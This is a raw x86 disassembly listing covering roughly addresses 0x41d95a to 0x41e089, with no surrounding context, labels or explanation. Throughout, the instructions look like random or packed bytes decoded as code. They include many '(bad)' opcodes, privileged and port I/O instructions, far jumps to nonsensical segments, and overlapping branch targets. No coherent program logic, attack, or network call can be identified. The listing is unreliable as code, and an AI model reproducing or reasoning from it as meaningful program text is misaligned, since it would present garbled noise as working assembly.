  41d95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d95b:	out    0x5b,eax
  41d95d:	pop    eax
  41d95e:	inc    eax
  41d95f:	mov    ah,0x29
  41d961:	xchg   edi,eax
  41d962:	shl    BYTE PTR [esi],0x8
  41d965:	enter  0x77c,0xda
  41d969:	pushf  
  41d96a:	jge    0x41d9c3
  41d96c:	shr    ah,1
  41d96e:	fiadd  DWORD PTR [eax+0x7496158c]
  41d974:	jmp    0x7061:0x5df20369
  41d97b:	gs mov bh,0x74
  41d97e:	adc    esi,ebx
  41d980:	cdq    
  41d981:	sub    ch,dh
  41d983:	pushf  
  41d984:	xor    ah,dl
  41d986:	mov    dl,0x7a
  41d988:	pop    ebx
  41d989:	push   0x12
  41d98b:	or     eax,0x353bc3e0
  41d990:	dec    eax
  41d991:	fild   QWORD PTR [eax-0x23]
  41d994:	mov    ecx,0xc3bc9d7f
  41d999:	cmp    DWORD PTR [edi-0x6e],eax
  41d99c:	adc    DWORD PTR [edx+edx*1+0x5a],eax
  41d9a0:	xor    dl,cl
  41d9a2:	push   edx
  41d9a3:	stc    
  41d9a4:	dec    esp
  41d9a5:	lea    eax,[ecx+eiz*4]
  41d9a8:	and    al,0x43
  41d9aa:	fwait
  41d9ab:	test   al,0x1d
  41d9ad:	(bad)  
  41d9ae:	ss or  ebx,edx
  41d9b1:	push   edx
  41d9b2:	pushf  
  41d9b3:	test   al,0x4f
  41d9b5:	js     0x41d965
  41d9b7:	pop    ebp
  41d9b8:	js     0x41d9f4
  41d9ba:	sar    DWORD PTR [ebx],0x6f
  41d9bd:	sbb    ebx,ebx
  41d9bf:	mov    bh,0x33
  41d9c1:	xlat   BYTE PTR ds:[ebx]
  41d9c2:	mov    eax,0xfedaea80
  41d9c7:	mov    WORD PTR [edx+ebx*4+0x2566b59d],?
  41d9ce:	aas    
  41d9cf:	pop    es
  41d9d0:	loopne 0x41da2d
  41d9d2:	jo     0x41d9d6
  41d9d4:	jo     0x41d964
  41d9d6:	sbb    ebx,ebp
  41d9d8:	lods   eax,DWORD PTR ds:[esi]
  41d9d9:	mov    ah,0xc4
  41d9db:	fwait
  41d9dc:	add    DWORD PTR [ebp-0x4b],ebp
  41d9df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9e0:	imul   ebp,ebp,0xc86b3ecf
  41d9e6:	mov    ebx,edi
  41d9e8:	pop    edx
  41d9e9:	add    dh,BYTE PTR [esi]
  41d9eb:	inc    ebx
  41d9ec:	das    
  41d9ed:	cmp    al,0x87
  41d9ef:	out    dx,eax
  41d9f0:	sbb    DWORD PTR [edi+0x7bc26122],ebx
  41d9f6:	ins    DWORD PTR es:[edi],dx
  41d9f7:	cmp    ch,ah
  41d9f9:	dec    edx
  41d9fa:	sub    ebx,DWORD PTR [edx]
  41d9fc:	test   eax,0x470f02b6
  41da01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da02:	loopne 0x41da3f
  41da04:	sbb    ch,BYTE PTR [eax-0x66]
  41da07:	cmp    BYTE PTR [edx],bh
  41da09:	mov    ah,0xb
  41da0b:	mov    dl,0x6
  41da0d:	push   eax
  41da0e:	loop   0x41da2d
  41da10:	adc    DWORD PTR [edx+0xd0c7f83],esp
  41da16:	div    ebx
  41da18:	add    ch,BYTE PTR [esi-0x6955d697]
  41da1e:	push   esi
  41da1f:	inc    esp
  41da20:	push   ss
  41da21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da22:	push   edi
  41da23:	pop    ebp
  41da24:	in     al,0x9b
  41da26:	ds dec eax
  41da28:	not    DWORD PTR [edi+ebp*4]
  41da2b:	inc    eax
  41da2c:	jo     0x41da83
  41da2e:	and    ebx,esp
  41da30:	je     0x41d9e9
  41da32:	pop    edx
  41da33:	inc    ebp
  41da34:	into   
  41da35:	mov    BYTE PTR [esp+ecx*1],al
  41da38:	ret    0xbfc2
  41da3b:	xchg   esp,eax
  41da3c:	fnstcw WORD PTR [esi-0x4e943cbd]
  41da42:	adc    DWORD PTR [esi+0x66],0xffffffa4
  41da46:	push   ebp
  41da47:	xchg   edx,eax
  41da48:	leave  
  41da49:	mov    cl,0xcb
  41da4b:	aad    0xdc
  41da4d:	and    BYTE PTR [edi],ah
  41da4f:	or     BYTE PTR [eax+ebp*1+0x1b],0x92
  41da54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da55:	adc    DWORD PTR [edi+0x59],eax
  41da58:	mov    eax,ds:0x8f50d791
  41da5d:	jns    0x41da3f
  41da5f:	clc    
  41da60:	xchg   ecx,eax
  41da61:	mov    ch,0x2e
  41da63:	jbe    0x41da38
  41da65:	mov    ecx,0x56c60ea7
  41da6a:	dec    ebx
  41da6b:	xchg   edi,eax
  41da6c:	iret   
  41da6d:	popa   
  41da6e:	pop    ebp
  41da6f:	dec    ecx
  41da70:	jle    0x41da92
  41da72:	adc    DWORD PTR [ebx+eiz*1],ecx
  41da75:	test   al,0xeb
  41da77:	jnp    0x41da65
  41da79:	fist   DWORD PTR [ebp-0x55]
  41da7c:	cmp    cl,BYTE PTR [ebp+0x26]
  41da7f:	mov    al,0xc5
  41da81:	cmp    al,0xfb
  41da83:	cmp    BYTE PTR [edi-0x4db186e4],al
  41da89:	or     ch,BYTE PTR [ecx-0x6fea9165]
  41da8f:	sbb    dl,BYTE PTR [eax+0x42]
  41da92:	add    BYTE PTR [ecx-0x62],dh
  41da95:	xchg   ebp,eax
  41da96:	cmp    edx,DWORD PTR [edx]
  41da98:	mov    BYTE PTR [ecx+0x2b],ah
  41da9b:	(bad)  
  41da9d:	and    eax,0x8f8a95cd
  41daa2:	mov    cl,0xfb
  41daa4:	sub    DWORD PTR [edx+esi*8+0x33af55b6],edi
  41daab:	popa   
  41daac:	jnp    0x41dadc
  41daae:	gs push ebp
  41dab0:	push   0xffffffb8
  41dab2:	sbb    DWORD PTR [edi-0x2d],eax
  41dab5:	dec    ebp
  41dab6:	inc    esp
  41dab7:	iret   
  41dab8:	jae    0x41dad2
  41daba:	inc    esp
  41dabb:	retf   
  41dabc:	ror    ebx,1
  41dabe:	inc    ebx
  41dabf:	bound  eax,QWORD PTR [esi+ebx*4+0x31]
  41dac3:	and    ecx,DWORD PTR [ebx-0x14]
  41dac6:	sti    
  41dac7:	in     eax,0xdb
  41dac9:	sbb    DWORD PTR [edx-0x1f0452b7],0xfffffff4
  41dad0:	jecxz  0x41daa0
  41dad2:	dec    edx
  41dad3:	sub    edi,0x50
  41dad6:	fistp  WORD PTR [ecx-0x61]
  41dada:	mov    edx,0xa3b6f3a9
  41dadf:	in     eax,dx
  41dae0:	out    dx,al
  41dae1:	sub    esi,esi
  41dae3:	pop    ebx
  41dae4:	dec    edi
  41dae5:	mov    ebx,DWORD PTR [ecx]
  41dae7:	jo     0x41db65
  41dae9:	xor    al,0x70
  41daeb:	jne    0x41db09
  41daed:	pusha  
  41daee:	add    al,0x23
  41daf0:	and    edi,DWORD PTR [esp+ecx*8-0xeb10cf9]
  41daf7:	lods   al,BYTE PTR ds:[esi]
  41daf8:	ds jbe 0x41db6e
  41dafb:	loopne 0x41db4f
  41dafd:	es lahf 
  41daff:	cmp    ch,BYTE PTR fs:[edx-0x3881fb13]
  41db06:	and    DWORD PTR [esi],ebp
  41db08:	pop    ds
  41db09:	inc    edi
  41db0a:	inc    esp
  41db0b:	dec    esi
  41db0c:	jmp    0x41daa0
  41db0e:	call   0x9aaf464c
  41db13:	in     al,dx
  41db14:	bound  esi,QWORD PTR [esi-0x56]
  41db17:	stos   BYTE PTR es:[edi],al
  41db18:	call   0x1d77:0xc100e27
  41db1f:	iret   
  41db20:	lods   al,BYTE PTR ds:[esi]
  41db21:	inc    esi
  41db22:	add    al,0x6b
  41db24:	inc    ebx
  41db25:	lock cmp eax,DWORD PTR [eax-0x40]
  41db29:	xor    esp,ebx
  41db2b:	cmp    eax,DWORD PTR [edi+0x65]
  41db2e:	inc    ecx
  41db2f:	jb     0x41db3d
  41db31:	mov    esp,DWORD PTR [ecx-0x3c1388c]
  41db37:	cs je  0x41db08
  41db3a:	adc    esp,DWORD PTR [ebp+ebx*2+0x3e]
  41db3e:	leave  
  41db3f:	mov    edx,0xddd28de0
  41db44:	not    BYTE PTR [ecx]
  41db46:	inc    edx
  41db47:	sar    DWORD PTR [ebp+edi*8+0x468743a1],0x94
  41db4f:	cdq    
  41db50:	push   ecx
  41db51:	push   eax
  41db52:	sub    bl,dl
  41db54:	xor    al,0x6b
  41db56:	ds dec esp
  41db58:	add    ebp,edx
  41db5a:	sbb    eax,0x311d6cb0
  41db5f:	cmp    al,0x38
  41db61:	retf   
  41db62:	retf   0x21f9
  41db65:	mov    esp,0x4933271d
  41db6a:	je     0x41db4d
  41db6c:	push   esi
  41db6d:	mov    dl,0xc
  41db6f:	rcr    DWORD PTR [eax],cl
  41db71:	add    esi,DWORD PTR [eax]
  41db73:	int    0x2c
  41db75:	outs   dx,BYTE PTR ds:[esi]
  41db76:	icebp  
  41db77:	adc    cl,BYTE PTR [ecx+0x3508f59e]
  41db7d:	dec    edi
  41db7e:	fadd   st,st(0)
  41db80:	sbb    al,0xe8
  41db83:	mov    cl,0x3c
  41db85:	mov    ds:0x6b144b72,eax
  41db8a:	mov    al,0x2
  41db8c:	add    DWORD PTR [ebx-0x2d],0xffffffe1
  41db90:	or     al,0x30
  41db92:	pop    ds
  41db93:	fistp  WORD PTR [esi+0x2c22fd03]
  41db99:	fcomip st,st(7)
  41db9b:	out    dx,al
  41db9c:	inc    ecx
  41db9d:	add    BYTE PTR [ecx],bl
  41db9f:	pop    ecx
  41dba0:	imul   edx,ecx,0x28
  41dba3:	xchg   edi,eax
  41dba4:	aad    0x35
  41dba6:	xchg   ebx,eax
  41dba7:	popf   
  41dba8:	mov    ecx,ds
  41dbaa:	inc    esp
  41dbab:	imul   ebx,ebx,0x3c
  41dbae:	inc    ebx
  41dbaf:	hlt    
  41dbb0:	stc    
  41dbb1:	jbe    0x41dbd6
  41dbb3:	or     BYTE PTR [ebp+eiz*4-0x365310d6],ch
  41dbba:	cmp    eax,0x3fce46a7
  41dbbf:	xor    DWORD PTR ds:0x60fecc6d,edi
  41dbc5:	retf   
  41dbc6:	in     al,dx
  41dbc7:	xchg   ebx,eax
  41dbc8:	jge    0x41db7c
  41dbca:	stos   BYTE PTR es:[edi],al
  41dbcb:	div    BYTE PTR [ebp+0x8]
  41dbce:	ins    BYTE PTR es:[edi],dx
  41dbcf:	(bad)  
  41dbd0:	outs   dx,BYTE PTR ds:[esi]
  41dbd1:	push   es
  41dbd2:	retf   
  41dbd3:	(bad)  [esi]
  41dbd5:	and    edx,DWORD PTR [esi+eiz*1]
  41dbd8:	mov    esp,?
  41dbda:	pop    es
  41dbdb:	pop    edi
  41dbdc:	popf   
  41dbdd:	das    
  41dbde:	aaa    
  41dbdf:	jne    0x41dbd4
  41dbe1:	xor    dh,BYTE PTR [edi+eax*1-0x35]
  41dbe5:	sub    bh,ch
  41dbe7:	xor    BYTE PTR fs:[edi+0x3c],ch
  41dbeb:	xchg   esi,eax
  41dbec:	mov    cl,0xfe
  41dbee:	jae    0x41dc2c
  41dbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf1:	repnz mov edi,es
  41dbf4:	or     bh,BYTE PTR [edi+0x63]
  41dbf7:	rcl    BYTE PTR [edi+0x9afbf57],cl
  41dbfd:	mov    ah,0xd3
  41dbff:	pop    ds
  41dc00:	(bad)  
  41dc01:	sbb    al,0xe
  41dc03:	and    DWORD PTR [eax],edi
  41dc05:	mov    ch,0xb6
  41dc07:	dec    ecx
  41dc08:	xor    edi,ecx
  41dc0a:	cld    
  41dc0b:	cmp    dl,BYTE PTR [esi+eax*8-0x80]
  41dc0f:	mov    al,0xca
  41dc11:	rcr    dl,1
  41dc13:	ret    
  41dc14:	add    DWORD PTR [ebx],0x47
  41dc17:	fidiv  WORD PTR [ebp-0x1c2e57c1]
  41dc1d:	or     BYTE PTR [ebx+ebx*2+0x106dea59],dh
  41dc24:	mov    eax,ds:0xc10f2a72
  41dc29:	loope  0x41dca0
  41dc2b:	mov    dl,0xb4
  41dc2d:	pop    ds
  41dc2e:	loopne 0x41dc2b
  41dc30:	fidivr DWORD PTR [edx+0x5]
  41dc33:	addr16 stc 
  41dc35:	mov    eax,0xb1f477fc
  41dc3a:	leave  
  41dc3b:	push   esp
  41dc3c:	outs   dx,BYTE PTR ds:[esi]
  41dc3d:	ret    0xdaed
  41dc40:	js     0x41dc05
  41dc42:	gs stos BYTE PTR es:[edi],al
  41dc44:	js     0x41dc48
  41dc46:	add    al,0xf4
  41dc48:	jb     0x41dc43
  41dc4a:	mov    ecx,0x9db62809
  41dc4f:	loopne 0x41dc8b
  41dc51:	in     al,dx
  41dc52:	mov    dl,0xc6
  41dc54:	call   0x692a:0xc3efe8db
  41dc5b:	fld    DWORD PTR [ebx+ecx*8+0x6a412b62]
  41dc62:	mov    BYTE PTR [edi],bh
  41dc64:	leave  
  41dc65:	dec    ebp
  41dc66:	mov    edx,0x1ad7a613
  41dc6b:	push   edi
  41dc6c:	bswap  ebx
  41dc6e:	fs adc eax,0xe71c1d6c
  41dc74:	fwait
  41dc75:	xor    dh,bh
  41dc77:	cmp    esp,ebp
  41dc79:	dec    eax
  41dc7a:	adc    DWORD PTR [edx],ebp
  41dc7c:	xchg   esi,eax
  41dc7d:	push   ebx
  41dc7e:	cmp    DWORD PTR [ecx],ebx
  41dc80:	jp     0x41dc91
  41dc82:	fs stos BYTE PTR es:[edi],al
  41dc84:	mov    al,0xdf
  41dc86:	pop    ecx
  41dc87:	or     eax,0xdadefab7
  41dc8c:	mov    ch,0xf9
  41dc8e:	mov    ah,0x2d
  41dc90:	dec    ebp
  41dc91:	mov    dl,BYTE PTR [edi-0x4e]
  41dc94:	pop    ss
  41dc95:	fsubr  st,st(6)
  41dc97:	div    DWORD PTR [edx]
  41dc99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc9a:	je     0x41dc57
  41dc9c:	lds    esp,FWORD PTR [edx+ebx*4+0x102395a5]
  41dca3:	lds    eax,FWORD PTR [ebx]
  41dca5:	ffree  st(4)
  41dca7:	pop    ebx
  41dca8:	jge    0x41dc50
  41dcaa:	adc    eax,0x5f188214
  41dcaf:	pushf  
  41dcb0:	leave  
  41dcb1:	adc    DWORD PTR [ecx-0x5e],esi
  41dcb4:	ret    
  41dcb5:	xor    esp,DWORD PTR [esi-0x77]
  41dcb8:	lea    esi,ds:0xee834c61
  41dcbe:	lahf   
  41dcbf:	test   BYTE PTR [ebp+0x609dc7e6],bl
  41dcc5:	aad    0xc7
  41dcc7:	cmp    dh,BYTE PTR ds:0x31c806a1
  41dccd:	imul   esp,DWORD PTR [ebx],0x42992d04
  41dcd3:	jnp    0x41dc87
  41dcd5:	jge    0x41dce7
  41dcd7:	nop
  41dcd8:	adc    al,0x7f
  41dcda:	and    ebx,DWORD PTR ds:0xc34e3b08
  41dce0:	sub    DWORD PTR [edi+0xd],ecx
  41dce3:	(bad)  
  41dce4:	std    
  41dce5:	sbb    al,0xe6
  41dce7:	popf   
  41dce8:	fisttp WORD PTR [edx-0x60]
  41dceb:	or     al,0xf6
  41dced:	into   
  41dcee:	inc    esi
  41dcef:	xchg   DWORD PTR [eax+esi*1+0x8],esi
  41dcf3:	mov    ds:0xee127929,al
  41dcf8:	fcom   QWORD PTR [edi-0x58]
  41dcfb:	rcl    BYTE PTR [edi-0x40],cl
  41dcfe:	xor    DWORD PTR [edi+0x40],edi
  41dd01:	inc    esp
  41dd02:	adc    edx,DWORD PTR [edi+0x11]
  41dd05:	lods   al,BYTE PTR ds:[esi]
  41dd06:	popa   
  41dd07:	mov    ah,0xbc
  41dd09:	ins    DWORD PTR es:[edi],dx
  41dd0a:	aaa    
  41dd0b:	int3   
  41dd0c:	test   eax,0xff9e9058
  41dd11:	lods   eax,DWORD PTR ds:[esi]
  41dd12:	cmp    ah,BYTE PTR [edi+0x3250e7fe]
  41dd18:	arpl   WORD PTR [eax+0x12],bp
  41dd1b:	es mov ebx,0xf577276a
  41dd21:	mov    WORD PTR [eax+0x6c],fs
  41dd24:	cdq    
  41dd25:	add    bl,cl
  41dd27:	lods   al,BYTE PTR ds:[esi]
  41dd28:	int3   
  41dd29:	js     0x41dd64
  41dd2b:	mov    ds:0x78a43077,eax
  41dd30:	inc    edx
  41dd31:	xchg   edi,eax
  41dd32:	outs   dx,DWORD PTR ds:[esi]
  41dd33:	fld    TBYTE PTR [edi]
  41dd35:	fs out dx,eax
  41dd37:	not    BYTE PTR [ecx+0x22]
  41dd3a:	and    edx,DWORD PTR [ebp-0x6c]
  41dd3d:	sbb    edx,eax
  41dd3f:	loope  0x41dd8b
  41dd41:	pop    ds
  41dd42:	loope  0x41dda7
  41dd44:	jl     0x6bca7d88
  41dd4a:	(bad)  [edi-0x16506249]
  41dd50:	test   BYTE PTR [esi+0x7b],dh
  41dd53:	ja     0x41dd78
  41dd55:	pushf  
  41dd56:	pop    ebp
  41dd57:	mov    bh,0x60
  41dd59:	cmp    DWORD PTR [edx+0x436e3bc],esp
  41dd5f:	scas   eax,DWORD PTR es:[edi]
  41dd60:	cwde   
  41dd61:	push   0xffffffd9
  41dd63:	ins    BYTE PTR es:[edi],dx
  41dd64:	cmc    
  41dd65:	imul   esi,DWORD PTR [edi-0x27],0x5440a403
  41dd6c:	mov    esp,eax
  41dd6e:	and    ch,BYTE PTR [edi-0x8]
  41dd71:	(bad)  
  41dd72:	mov    edx,0xdbb43a8f
  41dd77:	retf   0xa86d
  41dd7a:	arpl   dx,cx
  41dd7c:	push   es
  41dd7d:	pop    esi
  41dd7f:	mov    cl,BYTE PTR [ecx+0x2b69142]
  41dd85:	scas   eax,DWORD PTR es:[edi]
  41dd86:	out    dx,eax
  41dd87:	adc    esp,DWORD PTR [esp+ebx*1]
  41dd8a:	adc    BYTE PTR [edi],ch
  41dd8c:	push   esi
  41dd8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd8e:	inc    edi
  41dd8f:	fcom   QWORD PTR [ebp+0x32]
  41dd92:	in     al,0x28
  41dd94:	scas   eax,DWORD PTR es:[edi]
  41dd95:	jno    0x41dd30
  41dd97:	rcr    BYTE PTR [ebx+0xd37c569],0x5e
  41dd9e:	(bad)  
  41dd9f:	fldln2 
  41dda1:	pop    esp
  41dda2:	scas   al,BYTE PTR es:[edi]
  41dda3:	push   cs
  41dda4:	push   ecx
  41dda5:	repnz mov ah,0x4a
  41dda8:	rcl    DWORD PTR [eax+0x60f26e91],cl
  41ddae:	cdq    
  41ddaf:	jae    0x41ddea
  41ddb1:	jnp    0x41de0d
  41ddb3:	mov    ah,0x4f
  41ddb5:	mov    ah,0xe
  41ddb7:	push   edx
  41ddb8:	sub    bh,dl
  41ddba:	pop    ecx
  41ddbb:	test   BYTE PTR [ebp+0x4757c938],dl
  41ddc1:	lock xlat BYTE PTR ds:[ebx]
  41ddc3:	inc    ecx
  41ddc4:	xchg   edx,eax
  41ddc5:	int    0x20
  41ddc7:	retf   
  41ddc8:	rcr    BYTE PTR [edx],0x56
  41ddcb:	gs das 
  41ddcd:	data16 setle BYTE PTR [esi-0x4b]
  41ddd2:	mov    eax,ds:0x92e55332
  41ddd7:	jp     0x41dd85
  41ddd9:	fld    DWORD PTR [edx-0xd902f32]
  41dddf:	imul   ecx,DWORD PTR [ecx],0xf531bee5
  41dde5:	sbb    DWORD PTR [ecx+0x1c],ebp
  41dde8:	in     al,0xc6
  41ddea:	aam    0xec
  41ddec:	sbb    al,0x38
  41ddee:	loopne 0x41ddce
  41ddf0:	ss ja  0x41dd8b
  41ddf3:	xchg   DWORD PTR [ebx-0x7d267d86],edi
  41ddf9:	clc    
  41ddfa:	pusha  
  41ddfb:	mov    dh,0xea
  41ddfd:	ins    DWORD PTR es:[edi],dx
  41ddfe:	jl     0x41de5e
  41de00:	pop    es
  41de01:	mov    bl,0xef
  41de03:	adc    dh,BYTE PTR [ebx]
  41de05:	in     eax,dx
  41de06:	jle    0x41dd9f
  41de08:	jg     0x41ddb5
  41de0a:	nop
  41de0b:	in     al,0xa2
  41de0d:	jne    0x41de16
  41de0f:	and    esp,edx
  41de11:	add    ebx,esi
  41de13:	lahf   
  41de14:	sbb    dl,BYTE PTR [edi]
  41de16:	(bad)  
  41de17:	neg    DWORD PTR [edi+0x13]
  41de1a:	stc    
  41de1b:	add    eax,0x5068eb80
  41de20:	(bad)  [eax-0x40c8c4be]
  41de26:	aam    0xc8
  41de28:	sbb    ebx,DWORD PTR [ebx+0x52]
  41de2b:	mov    eax,ds:0xb31f2394
  41de30:	das    
  41de31:	sbb    bl,ah
  41de33:	pop    ss
  41de34:	and    DWORD PTR [ebx],esp
  41de36:	push   ss
  41de37:	xchg   ebx,eax
  41de38:	jnp    0x41de84
  41de3a:	push   ebp
  41de3b:	mov    ah,bh
  41de3d:	cdq    
  41de3e:	push   esp
  41de3f:	out    dx,eax
  41de40:	outs   dx,DWORD PTR ds:[esi]
  41de41:	test   ecx,0x566aa70
  41de47:	lahf   
  41de48:	and    ebx,edi
  41de4a:	add    bl,dl
  41de4c:	fstp   QWORD PTR [edi+0x13]
  41de4f:	ins    DWORD PTR es:[edi],dx
  41de50:	mov    ah,0x29
  41de52:	call   0x2427:0x3dc71a2b
  41de59:	jl     0x41de52
  41de5b:	and    BYTE PTR [edi+esi*1+0x1d761b],0x32
  41de63:	(bad)  
  41de65:	sti    
  41de66:	cmp    DWORD PTR [ebp+0x4a],ebx
  41de69:	adc    bl,0x7d
  41de6c:	and    eax,0x6c89432a
  41de71:	push   ecx
  41de72:	push   esi
  41de73:	mov    al,ds:0x1eece156
  41de78:	add    ah,BYTE PTR [ecx-0x6d779e15]
  41de7e:	or     al,0x1b
  41de80:	js     0x41ded1
  41de82:	enter  0xbc1d,0x18
  41de86:	sahf   
  41de87:	jmp    0x408cea60
  41de8c:	cld    
  41de8d:	sbb    edx,DWORD PTR [esi-0x25]
  41de90:	ins    DWORD PTR es:[edi],dx
  41de91:	dec    ebp
  41de92:	inc    eax
  41de94:	add    ebp,DWORD PTR [ecx+0x4a]
  41de97:	arpl   WORD PTR [edx+0x74],ax
  41de9a:	push   es
  41de9b:	mov    al,0xd5
  41de9d:	and    dl,dl
  41de9f:	add    ebp,DWORD PTR [edx+0x29]
  41dea2:	jmp    0x52f3:0x1a505b11
  41dea9:	punpckhbw mm1,mm7
  41deac:	cmp    al,BYTE PTR [ebp+eiz*2-0x44680d07]
  41deb3:	fwait
  41deb4:	int    0xc6
  41deb6:	lods   al,BYTE PTR ds:[esi]
  41deb7:	push   0x9a61e2b6
  41debc:	add    al,0x49
  41debe:	jecxz  0x41de6a
  41dec0:	pop    ss
  41dec1:	push   ebp
  41dec2:	jle    0x41dec6
  41dec4:	cmp    al,0x8b
  41dec6:	dec    edx
  41dec7:	and    BYTE PTR [ecx-0x77a3b078],ah
  41decd:	cmp    dh,BYTE PTR [eax+0x6b]
  41ded0:	adc    ebx,DWORD PTR [edx]
  41ded2:	(bad)  
  41ded3:	test   eax,0xd857668
  41ded8:	popa   
  41ded9:	mov    ds:0x1c98f1b5,eax
  41dede:	jmp    0xf6da:0xfab4f811
  41dee5:	call   0xaf57:0xbc48b80c
  41deec:	icebp  
  41deed:	jne    0x41def5
  41deef:	aaa    
  41def0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41def1:	jmp    0x326a7ef8
  41def6:	sub    BYTE PTR [ecx+0x62],0xac
  41defa:	pop    ss
  41defb:	lods   eax,DWORD PTR ds:[esi]
  41defc:	ja     0x41deca
  41defe:	push   ss
  41deff:	call   0x2fea9fcb
  41df04:	push   esp
  41df05:	icebp  
  41df06:	lods   eax,DWORD PTR ds:[esi]
  41df07:	retf   0xdf5c
  41df0a:	jne    0x41df62
  41df0c:	pushf  
  41df0d:	jo     0x41df2b
  41df0f:	scas   eax,DWORD PTR es:[edi]
  41df10:	jmp    0xad9b:0x5f2fd936
  41df17:	cmp    al,0x7e
  41df19:	jl     0x41df15
  41df1b:	(bad)  
  41df1c:	out    dx,eax
  41df1d:	or     edi,DWORD PTR [edx+0x5c]
  41df20:	int3   
  41df21:	rcr    DWORD PTR [ecx+0x5abf079c],1
  41df27:	sbb    cl,0xdd
  41df2a:	fs ds scas eax,DWORD PTR es:[edi]
  41df2d:	push   ss
  41df2e:	push   eax
  41df2f:	loopne 0x41df82
  41df31:	fucomi st,st(7)
  41df33:	add    BYTE PTR [eax-0x41],dl
  41df36:	jne    0x41df16
  41df38:	jl     0x41dfb7
  41df3a:	xchg   esp,eax
  41df3b:	pop    eax
  41df3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df3d:	(bad)  
  41df3e:	sub    BYTE PTR es:0xd80c70ca,al
  41df45:	fidivr DWORD PTR [edx]
  41df47:	mov    al,ds:0x5092c10b
  41df4c:	ins    DWORD PTR es:[edi],dx
  41df4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df4e:	and    edi,esp
  41df50:	ror    DWORD PTR [edx-0x2d9b0fae],cl
  41df56:	mov    ebx,0xff2af6c4
  41df5b:	cli    
  41df5c:	or     ch,BYTE PTR [eax-0x4ee4d07f]
  41df62:	std    
  41df63:	iret   
  41df64:	daa    
  41df65:	xchg   edx,eax
  41df66:	and    DWORD PTR [edx-0x7e],0xffffffa0
  41df6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df6b:	push   esp
  41df6c:	into   
  41df6d:	xor    DWORD PTR [ebx+0x6d9f3556],0xd4a0c35b
  41df77:	paddusb mm4,QWORD PTR [esi]
  41df7a:	mov    al,0xd4
  41df7c:	or     DWORD PTR [esi],ecx
  41df7e:	mov    esi,0x9893e08a
  41df83:	adc    BYTE PTR [ecx+ebp*8-0x53],dl
  41df87:	or     eax,0x7e0e1ec
  41df8c:	pop    ebp
  41df8d:	pop    edi
  41df8e:	enter  0x6a50,0x87
  41df92:	nop
  41df93:	fdiv   DWORD PTR [ecx]
  41df95:	sub    bl,dh
  41df97:	dec    ebx
  41df98:	or     ebp,DWORD PTR [ebp-0x2d7fa75f]
  41df9e:	fsub   DWORD PTR [esi]
  41dfa0:	jmp    0x94a895ff
  41dfa5:	popa   
  41dfa6:	pop    edi
  41dfa7:	mov    WORD PTR [esi-0x59],es
  41dfaa:	xor    BYTE PTR [ebp+eax*8+0x68],bl
  41dfae:	mov    dh,0xb3
  41dfb0:	adc    BYTE PTR [edx-0x68b6d1eb],bh
  41dfb6:	imul   edi,DWORD PTR [ecx],0x237ca353
  41dfbc:	in     eax,0x18
  41dfbe:	aam    0xd2
  41dfc0:	out    0x80,eax
  41dfc2:	cmp    eax,0xd3bf4ee3
  41dfc7:	xchg   ebp,eax
  41dfc8:	add    al,0x51
  41dfca:	pop    eax
  41dfcb:	(bad)  
  41dfcc:	cdq    
  41dfcd:	sub    edi,DWORD PTR [ebx]
  41dfcf:	fwait
  41dfd0:	jl     0x41df73
  41dfd2:	shr    BYTE PTR [ebp+0x1e11ac86],1
  41dfd8:	pop    edx
  41dfd9:	inc    ebp
  41dfda:	ret    
  41dfdb:	cmp    eax,0x1e74b250
  41dfe0:	int    0x1b
  41dfe2:	(bad)  
  41dfe4:	ret    0xf8f5
  41dfe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfe8:	inc    ebp
  41dfe9:	push   ecx
  41dfea:	fistp  QWORD PTR [ecx+0x6e648fa0]
  41dff0:	or     ebp,DWORD PTR [eax+edx*4]
  41dff3:	not    DWORD PTR [edi-0x6e]
  41dff6:	ret    
  41dff7:	adc    DWORD PTR [edi+ebp*2+0x75],esi
  41dffb:	and    edi,DWORD PTR [ecx-0x70]
  41dffe:	inc    ecx
  41dfff:	or     al,0x65
  41e001:	jne    0x41dfed
  41e003:	add    eax,0xacd6a77b
  41e008:	push   ebp
  41e009:	sub    eax,0xf15a6327
  41e00e:	push   edi
  41e00f:	sbb    BYTE PTR [edi+ebx*8],ah
  41e012:	xor    cl,BYTE PTR [edx-0x7a8e957f]
  41e018:	out    dx,eax
  41e019:	enter  0xd5ec,0x7c
  41e01d:	push   esi
  41e01e:	mov    ch,BYTE PTR [ebx]
  41e020:	clc    
  41e021:	repnz fistp DWORD PTR [ebp-0x76f3b40c]
  41e028:	fadd   QWORD PTR [esi]
  41e02a:	mov    edi,0x7dd47981
  41e02f:	fisub  WORD PTR [ecx+0x6]
  41e032:	add    BYTE PTR [ebp-0x1d3995c],ah
  41e038:	fstp   TBYTE PTR [ebp-0x7e]
  41e03b:	fsubr  st,st(1)
  41e03d:	or     esi,DWORD PTR [esi-0xa41b4c]
  41e043:	test   eax,0x9192c3fc
  41e048:	sub    ecx,DWORD PTR [edx]
  41e04a:	jecxz  0x41e022
  41e04c:	clc    
  41e04d:	int    0x15
  41e04f:	and    esp,ecx
  41e051:	(bad)  
  41e052:	xor    ebp,ecx
  41e054:	jl     0x41e048
  41e056:	inc    eax
  41e057:	imul   edx,DWORD PTR [esi-0x1f],0xcb894873
  41e05e:	mov    esp,0xd555050
  41e063:	mov    DWORD PTR [ebx+0x50],edi
  41e066:	jo     0x41e06a
  41e068:	jmp    0xb1cb:0x53cece29
  41e06f:	push   ebp
  41e070:	mov    ecx,0x22f0619f
  41e075:	icebp  
  41e076:	enter  0x65fc,0x8f
  41e07a:	and    al,0xa
  41e07c:	test   BYTE PTR [esi-0x7a],dl
  41e07f:	sub    ebp,DWORD PTR [eax+ebp*1-0x36]
  41e083:	mov    eax,0xca4862a
  41e088:	pop    ss
  41e089:	neg    ah
